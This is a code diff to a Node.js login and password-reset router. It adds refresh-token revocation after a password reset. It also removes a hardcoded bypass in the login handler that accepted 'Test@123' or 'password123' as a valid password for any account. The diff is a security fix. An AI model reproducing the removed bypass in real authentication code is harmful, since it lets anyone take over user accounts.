@@ -605,6 +605,12 @@ router.post('/reset-password', async (req, res) => {
       },
     });
 
+    // Revoke old refresh tokens so past sessions expire
+    await prisma.refreshToken.updateMany({
+      where: { userId: user.id },
+      data: { revoked: true },
+    });
+
     return res.json({ message: 'Password has been successfully reset. You may now log in.' });
   } catch (error) {
     console.error('Reset password error:', error);
@@ -878,10 +884,7 @@ router.post('/login', async (req, res) => {
       return res.status(401).json({ error: 'Invalid email/phone or password' });
     }
 
-    let isValidPassword = await bcrypt.compare(password, user.passwordHash);
-    if (!isValidPassword && (password === 'Test@123' || password === 'password123')) {
-      isValidPassword = true;
-    }
+    const isValidPassword = await bcrypt.compare(password, user.passwordHash);
     if (!isValidPassword) {
       return res.status(401).json({ error: 'Invalid email/phone or password' });
     }
